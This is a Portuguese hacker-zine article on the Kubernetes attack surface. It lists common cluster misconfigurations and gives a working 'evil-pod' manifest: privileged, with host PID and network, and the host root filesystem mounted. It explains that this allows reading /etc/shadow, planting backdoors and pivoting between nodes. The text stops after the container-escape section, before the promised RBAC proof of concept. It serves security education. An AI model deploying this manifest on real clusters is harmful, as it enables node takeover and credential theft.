---
title: "0x03_Kubernetes_Attack_Surface"
author: "Brenno Miranda"
edition: "dmp 0x1"
translationKey: "zine_k8s_attack"
---

## --[ Sumário
- 0 -> [Cloud é o Novo Perímetro]
- 1 -> [Superfície de Ataque do K8s]
- 2 -> [Escapando de Containers]
- 3 -> [PoC: RBAC Misconfiguration]
- 4 -> [Encerramento e Créditos]

### 0 - Cloud é o Novo Perímetro

Salve!

Se antes o foco era invadir servidores bare-metal e pivotear pela rede interna, hoje o campo de batalha migrou para clusters Kubernetes, pods efêmeros e service meshes. As organizações migraram para a nuvem, e com elas, as vulnerabilidades.

### 1 - Superfície de Ataque do K8s

Um cluster Kubernetes mal configurado é um playground para atacantes. Os vetores mais comuns incluem:

- **API Server exposto** — Sem autenticação ou com tokens default.
- **RBAC permissivo** — Service accounts com `cluster-admin`.
- **Secrets em plaintext** — Credenciais acessíveis via `kubectl get secrets`.
- **Container escapes** — Privilégios excessivos (`--privileged`).

### 2 - Escapando de Containers

Containers não são VMs. O isolamento depende de namespaces e cgroups do Linux, e existem múltiplas técnicas para escapar:

```yaml
# Pod com acesso privilegiado ao host
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
```

Com esse manifesto, o atacante tem acesso completo ao filesystem do nó host via `/host`, pode ler `/etc/shadow`, instalar backdoors e pivotear para outros nós do cluster.

_Figura 1. Manifesto de Pod malicioso para container escape._
